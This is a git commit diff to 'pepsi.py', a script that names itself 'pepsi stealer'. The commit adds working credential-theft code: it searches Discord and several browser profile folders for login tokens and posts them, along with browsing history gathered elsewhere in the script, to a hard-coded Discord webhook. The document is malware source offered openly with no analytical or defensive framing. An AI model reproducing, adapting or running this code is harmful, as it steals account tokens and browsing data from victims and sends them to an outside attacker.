ddcc6cc4fe8b9f82a42648bacbb9a97f76c1c406
infdevv <133452064+infdevv@users.noreply.github.com>
2024-03-03 09:11:23 -0600

    Update pepsi.py

--- pepsi.py
+++ pepsi.py
@@ -35,29 +35,86 @@ try:
             links = []
             for row in cursor.execute("SELECT url FROM urls"):
                 links.append(row[0])
+except:
+        pass
+
+
+
+ 
+import os
+import re
+import json
+from urllib.request import Request, urlopen
+
+# your webhook URL
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1213517165752492144/-dvwI93Lok88wnx3h5oo9z9FmQN7RzQSVlSyebVvQiZwj0_aeKhRzMzErAcOsmRwfFrs'
+
+# mentions you when you get a hit
+PING_ME = False
+
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = []
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+def main():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
+
+    message = '@everyone' if PING_ME else ''
+
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+
+        message += f'\n**{platform}**\n```\n'
+
+        tokens = find_tokens(path)
+
+        if len(tokens) > 0:
+            for token in tokens:
+                message += f'{token}\n'
+        else:
+            message += 'No tokens found.\n'
+
+        message += '```'
+
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
+
+    payload = json.dumps({'content': message})
+
+    try:
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
     except:
         pass
 
-    # Get token 
+if __name__ == '__main__':
+    main()
 
-    # Request base url
-    response="      "
-
-    req = Request(base_url, headers={'User-Agent': 'Mozilla/5.0'})
-    response = str(urlopen(req).read())
-    response=response.replace("_0xj.nonce = \\\'","BLINKER|||")
-    response=response.split("BLINKER|||")
-    response=response[1]
-    response=response.replace("\\';_0xj","|||BLINKER")
-    response=response.split("|||BLINKER")
-    response=response[0]
-    token=response
-    #print(token)
-
-    
-except Exception as e:
-    print(e)
-    pass
 
 link=links.split("\n")
 links=[]
@@ -69,7 +126,7 @@ for (url in links):
 
 embed={
     "username": "pepsi stealer",
-    "content": f"**Tokens:** {token} \n **History**: ```{links}```"
+    "content": f" **History**: ```{links}```"
   }
 
   # Send via requests and webhook url
